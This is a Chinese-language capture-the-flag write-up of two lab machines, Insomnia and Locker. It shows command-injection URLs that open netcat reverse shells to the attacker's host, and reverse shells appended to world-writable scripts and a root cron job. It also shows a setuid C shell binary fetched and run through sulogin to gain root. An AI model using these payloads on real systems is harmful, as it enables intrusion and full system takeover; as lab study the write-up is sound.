[{"title":"hackme","url":"/2025/08/04/hackme/","content":"\n## Insomnia\n\n扫描端口只开了一个8080,dirsearch扫目录\n\n扫到一个administration.php\n\n进行wfuzz得到参数是logfile\n\n尝试反弹shell\n\n```python\nhttp://192.168.56.59:8080/administration.php?logfile=;nc 192.168.56.4 1234 -e /bin/bash;\n```\n\nwww-data用户可以无密码指定julia执行start.sh\n\n```python\nwww-data@insomnia:~/html$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on insomnia:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on insomnia:\n    (julia) NOPASSWD: /bin/bash /var/www/html/start.sh\n```\n\n这里我们发现start.sh所有用户都可读可写可执行\n\n```python\nwww-data@insomnia:~/html$ ls -al\nls -al\ntotal 60\ndrwxr-xr-x 3 www-data www-data  4096 May 29 09:55 .\ndrwxr-xr-x 3 root     root      4096 Dec 17  2020 ..\n-rw-r--r-- 1 www-data www-data   426 Dec 21  2020 administration.php\n-rw-r--r-- 1 www-data www-data  1610 Dec 20  2020 chat.js\n-rw-r--r-- 1 www-data www-data 19679 May 30 03:24 chat.txt\ndrwxr-xr-x 2 www-data www-data  4096 Dec 20  2020 images\n-rw-r--r-- 1 www-data www-data  2899 Dec 21  2020 index.php\n-rw-r--r-- 1 www-data www-data  1684 Dec 20  2020 process.php\n-rwxrwxrwx 1 root     root        38 May 30 03:16 start.sh\n-rw-r--r-- 1 www-data www-data  1363 Dec 20  2020 style.css\n```\n\n写反弹shell指令\n\n```python\nwww-data@insomnia:~/html$ cat start.sh\ncat start.sh\nphp -S 0.0.0.0:8080\nnc 192.168.56.4 12345 -e /bin/bash\n```\n\n进入julia用户后利用定时任务提权\n\n```python\njulia@insomnia:~$ cat /etc/crontab\ncat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n*  *    * * *   root    /bin/bash /var/cron/check.sh\n```\n\n这里的check.sh也是全用户可读可写可执行\n\n```python\njulia@insomnia:~$ cat /var/cron/check.sh\ncat /var/cron/check.sh\n#!/bin/bash\nstatus=$(systemctl is-active insomnia.service)\nif [ \"$status\" == \"active\"  ]; then\n   echo \"OK\"\nelse\n   systemctl start  insomnia.service\nfi\nnc 192.168.56.4 1235 -e /bin/bash\n```\n\n监听等待即可\n\n```python\n┌──(kali㉿kali)-[~/Desktop/baji]\n└─$ nc -lvnp 1235\nlistening on [any] 1235 ...\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.59] 47920\nid\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n## Locker\n\n扫描端口只开了80端口\n\n```python\n┌──(kali㉿kali)-[~/Desktop/baji]\n└─$ curl http://192.168.56.51                                                             \n<h1>SUPER LOCKER</h1>\n<pre>\nUse root password to unlock our powers!\naAaaaAAaaAaAAaAAaAAaaaA!\n<a href=\"/locker.php?image=1\">Model 1</a>\n</pre>\n```\n\n/locker.php?image=1测试发现这里只能是123，其他的没有东西，也没在图片中发现有用的东西\n\n模糊测试得到\n\n```python\n┌──(kali㉿kali)-[~/Desktop/baji]\n└─$ curl http://192.168.56.51/locker.php?image=;pwd                                       \n<img src=\"data:image/jpg;base64,\"width=\"150\"height=\"150\"/>/home/kali/Desktop/baji\n```\n\n直接反弹shell\n\n```python\nhttp://192.168.56.51/locker.php?image=;nc%20192.168.56.50%201234%20-e%20%20/bin/bash;\n```\n\n寻找提权路径\n\n```python\nwww-data@locker:~/html$ find / -perm -u=s -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/sbin/sulogin\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\nwww-data@locker:~/html$ /usr/sbin/getcap -r / 2>/dev/null\n/usr/sbin/getcap -r / 2>/dev/null\n/usr/bin/ping = cap_net_raw+ep\n```\n\n有一个sulogin\n\n查看手册发现sulogin -e会切换到root\n\n但是我们实际执行却并没有成功，提示root用户被锁\n\n```python\nENVIRONMENT\n       sulogin looks for the environment variable SUSHELL or sushell to\n       determine what shell to start. If the environment variable is not\n       set, it will try to execute root’s shell from /etc/passwd. If that\n       fails, it will fall back to /bin/sh.\n环境\nsulogin 查找环境变量 SUSHELL 或 sushell 以\n确定要启动的 shell。如果环境变量不是\nset 中，它将尝试从 /etc/passwd 执行 root 的 shell。如果那\n失败，它将回退到 /bin/sh。\n```\n\n我们查看环境变量发现是空的\n\n```python\nwww-data@locker:~/html$ echo $SUSHELL\necho $SUSHELL\n\nwww-data@locker:~/html$ echo $sushell\necho $sushell\n```\n\n这里我们可以去写一个shell脚本并将其写入SUSHELL环境变量里面，利用sulogin的特性去执行提权\n\n```python\n#gcc -static shell.c -o shell静态编译避免libc版本依赖\n\n#include <stdio.h>\n#include <stdlib.h>    \n#include <sys/types.h>\n#include <unistd.h>\n\nint main() {\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n    return 0;\n}\n\n```\n\n编译后上传到靶机的tmp目录下，赋予可执行权限，然后将路径写入SUSHELL，之后我们在执行sulogin -e就会查找SUSHELL环境变量\n\n成功提权\n\n```python\nwww-data@locker:/tmp$ wget http://192.168.56.50:8000/shell\nwget http://192.168.56.50:8000/shell\n--2025-05-26 06:43:09--  http://192.168.56.50:8000/shell\nConnecting to 192.168.56.50:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 754968 (737K) [application/octet-stream]\nSaving to: 'shell'\n\nshell               100%[===================>] 737.27K  --.-KB/s    in 0.03s   \n\n2025-05-26 06:43:09 (25.1 MB/s) - 'shell' saved [754968/754968]\n\nwww-data@locker:/tmp$ ls -al\nls -al\ntotal 772\ndrwxrwxrwt  8 root     root       4096 May 26 06:43 .\ndrwxr-xr-x 18 root     root       4096 Jan 22  2021 ..\ndrwxrwxrwt  2 root     root       4096 May 26 05:10 .ICE-unix\ndrwxrwxrwt  2 root     root       4096 May 26 05:10 .Test-unix\ndrwxrwxrwt  2 root     root       4096 May 26 05:10 .X11-unix\ndrwxrwxrwt  2 root     root       4096 May 26 05:10 .XIM-unix\ndrwxrwxrwt  2 root     root       4096 May 26 05:10 .font-unix\n-rw-r--r--  1 www-data www-data 754968 May 26 06:42 shell\ndrwx------  3 root     root       4096 May 26 05:10 systemd-private-d8f518294ce94ec48cf3af339bf6e059-systemd-timesyncd.service-VF6OkN\nwww-data@locker:/tmp$ chmod +x shell\nchmod +x shell\nwww-data@locker:/tmp$ echo $SUSHELL\necho $SUSHELL\n/tmp/shell\nwww-data@locker:/tmp$ /usr/sbin/sulogin -e\n/usr/sbin/sulogin -e\nPress Enter for maintenance\n(or press Control-D to continue): \n\nroot@locker:~# id\nid\nuid=0(root) gid=0(root) groups=0(root),33(www-data)\n```\n\n## \n","categories":["writeup"]}]